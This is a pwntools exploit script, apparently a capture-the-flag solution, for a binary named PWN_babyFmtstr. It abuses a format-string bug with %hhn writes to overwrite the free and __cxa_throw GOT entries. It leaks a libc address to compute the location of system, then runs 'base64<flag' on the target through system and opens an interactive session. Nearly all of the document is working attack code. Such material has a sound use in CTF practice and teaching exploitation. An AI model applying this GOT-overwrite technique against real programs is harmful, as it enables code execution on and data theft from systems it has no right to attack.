from pwn import *
from LibcSearcher import *
p=process("./PWN_babyFmtstr")
elf=ELF('./PWN_babyFmtstr')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def quick(payload,motto=b'gggg'):
    p.sendlineafter(b'please input name:\n',payload)
    p.recvuntil(b'aa')
    p.recvuntil(b'please input size of motto:\n')
    p.sendline(b'20')
    p.sendlineafter(b'please input motto:\n',motto)


p.recvuntil(b'please input name:\n')
# payload=b'a'*8+b'-%p--%p--%p--%p--%p--%p--%p--%p--%p--%p-'
payload=b'%14c%12$hhn%133c%13$hhnaa%25$paa'
payload+=p64(elf.got['free']+1)+p64(elf.got['free'])
print(len(payload),payload)
p.sendline(payload)

p.recvuntil(b'Hello ')
p.recvuntil(b'aa')
# print(p.recv())
__libc_start_call_main=int(p.recv(14).decode(),16)-122#获得__libc_start_call_main
print('__libc_start_call_main',hex(__libc_start_call_main))
# libc=LibcSearcher('__libc_start_call_main',__libc_start_call_main)
libcbase=__libc_start_call_main-0x0000000000029190
# libcbase=__libc_start_call_main-libc.symbols['__libc_start_call_main']


print(hex(libcbase))
print(hex(libc.symbols['system']))
sys_addr=libcbase+libc.symbols['system']

print('system:',hex(sys_addr))
p.sendlineafter(b'please input size of motto:\n',b'10')
p.sendlineafter(b'please input motto:\n',b'gggg')

arg0=sys_addr&0xff
arg1=(sys_addr&0xff00)>>8
arg2=(sys_addr&0xff0000)>>16
arg3=(sys_addr&0xff000000)>>24
arg4=(sys_addr&0xff00000000)>>32
arg5=(sys_addr&0xff0000000000)>>40
payload2=b'%'+str(arg0).encode()+b'c%12$hhn%'
payload2+=str((arg1-arg0+0x100)%0x100).encode()+b'c%13$hhn%'
payload2=payload2.ljust(30,b'b')
payload2+=b'aa'
payload2+=p64(elf.got['__cxa_throw'])+p64(elf.got['__cxa_throw']+1)
print(len(payload2),payload2)
quick(payload2)

payload3=b'%'+str(arg2).encode()+b'c%12$hhn%'
payload3+=str((arg3-arg2+0x100)%0x100).encode()+b'c%13$hhn%'
payload3=payload3.ljust(30,b'b')
payload3+=b'aa'
payload3+=p64(elf.got['__cxa_throw']+2)+p64(elf.got['__cxa_throw']+3)
quick(payload3)
# pause()
payload4=b'%'+str(arg4).encode()+b'c%12$hhn%'
payload4+=str((arg5-arg4+0x100)%0x100).encode()+b'c%13$hhn%'
payload4=payload4.ljust(30,b'b')
payload4+=b'aa'
payload4+=p64(elf.got['__cxa_throw']+4)+p64(elf.got['__cxa_throw']+5)
quick(payload4)

payload5=b'base64<flag&&%2595c%12$hn%'
payload5=payload5.ljust(30,b'b')
payload5+=b'aa'
payload5+=p64(elf.got['free'])

motto=b'base64<flag'
# motto=b'cat flag'
quick(payload5,motto)
p.interactive()

